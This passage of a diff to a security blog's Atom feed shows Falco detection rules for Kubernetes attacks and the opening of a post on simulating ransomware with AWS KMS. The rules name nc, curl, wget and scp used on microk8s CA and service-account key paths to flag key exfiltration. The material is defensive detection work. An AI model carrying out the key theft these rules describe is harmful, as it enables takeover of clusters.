+    <span class="s">Suspicious read of Kubernetes private key file |</span>
+    <span class="s">process=%proc.name user=%user.name file=%fd.name container=%container.id</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">pki</span><span class="pi">,</span> <span class="nv">credential-access</span><span class="pi">,</span> <span class="nv">T1552</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Suspicious ServiceAccount Enumeration</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect attempts to list all service accounts cluster-wide</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.auth.decision = "allow" and</span>
+    <span class="s">ka.verb in ("get", "list") and</span>
+    <span class="s">ka.target.resource = "serviceaccounts" and</span>
+    <span class="s">not ka.user.name startswith "system:" and</span>
+    <span class="s">(</span>
+      <span class="s">ka.useragent icontains "Python" or </span>
+      <span class="s">ka.useragent icontains "go-http-client" or </span>
+      <span class="s">ka.useragent icontains "curl"</span>
+    <span class="s">)</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Cluster-wide ServiceAccount enumeration |</span>
+    <span class="s">user=%ka.user.name agent=%ka.useragent src=%ka.sourceips uri=%ka.uri</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">serviceaccount</span><span class="pi">,</span> <span class="nv">discovery</span><span class="pi">,</span> <span class="nv">T1613</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Kubernetes Private Key Exfil</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect common tools used to exfiltrate Kubernetes CA/SA keys</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type = execve and</span>
+    <span class="s">proc.name in (cp, scp, rsync, tar, nc, ncat, curl, wget, base64, bzip2, gzip) and</span>
+    <span class="s">(</span>
+      <span class="s">proc.args contains "/var/snap/microk8s/current/certs/ca.key" or </span>
+      <span class="s">proc.args contains "/var/snap/microk8s/current/certs/serviceaccount.key"</span>
+    <span class="s">)</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">[K8s Golden Ticket] Potential CA/SA key exfiltration using %proc.name |</span>
+    <span class="s">user=%user.name cmd=%proc.cmdline</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">pki</span><span class="pi">,</span> <span class="nv">exfiltration</span><span class="pi">,</span> <span class="nv">T1005</span><span class="pi">,</span> <span class="nv">credential-access</span><span class="pi">]</span>
+</code></pre></div></div>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>Kubernetes has matured into one of the most widely adopted container orchestration platforms in the world and as this blog has discussed, its attack surface is incredibly broad. New attack vectors are released constantly, emphasizing the importance of knowledge sharing for organizations to best secure themselves.</p>
+
+<p>Over the past several years, a wide collection of open-source tools have emerged to help organizations harden their clusters and test for misconfigurations. Tools exist such as <code class="language-plaintext highlighter-rouge">kube-bench</code>, which focuses on ensuring compliance with the CIS Kubernetes Benchmark. There are also tools that focus on demonstrating the attack paths a threat actor could take in a cluster like <a href="https://github.com/ReversecLabs/IceKube"><code class="language-plaintext highlighter-rouge">IceKube</code></a> and <code class="language-plaintext highlighter-rouge">KubeHound</code>.</p>
+
+<p>If you would like to read more about this topic, I highly recommend taking a look at <a href="https://raesene.github.io/">Rory McCune’s</a> or <a href="https://grahamhelton.com/">Graham Helton’s</a> blogs.</p>]]></content><author><name>HC</name></author><category term="research" /><category term="research" /><category term="cloud" /><category term="containers" /><category term="security" /><summary type="html"><![CDATA[What attackers do in Kubernetes—and how to catch them.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://heilancoos.github.io/img/kms-ransomware/kms-ransomware-diagram.png" /><media:content medium="image" url="https://heilancoos.github.io/img/kms-ransomware/kms-ransomware-diagram.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Simulating Ransomware with AWS KMS</title><link href="http://localhost:4000/research/2025/09/02/aws-kms-ransomware.html" rel="alternate" type="text/html" title="Simulating Ransomware with AWS KMS" /><published>2025-09-02T00:00:00-05:00</published><updated>2025-09-02T00:00:00-05:00</updated><id>http://localhost:4000/research/2025/09/02/aws-kms-ransomware</id><content type="html" xml:base="http://localhost:4000/research/2025/09/02/aws-kms-ransomware.html"><![CDATA[<h2 id="introduction">Introduction</h2>
 
 <p>The AWS Key Management Service (KMS) allows customers to create and manage encryption keys for their cloud resources,  with similar services existing in <a href="https://learn.microsoft.com/en-us/azure/security/fundamentals/key-management">Azure</a> and <a href="https://cloud.google.com/security/products/security-key-management?hl=en">Google Cloud Platform (GCP)</a>. KMS is essential for customers to properly secure their resources in the shared responsibility model. AWS makes it clear that while they provide the service and ensure the service itself is secure, it is the customer’s responsibility for how the service is used and how keys are protected.</p>
 
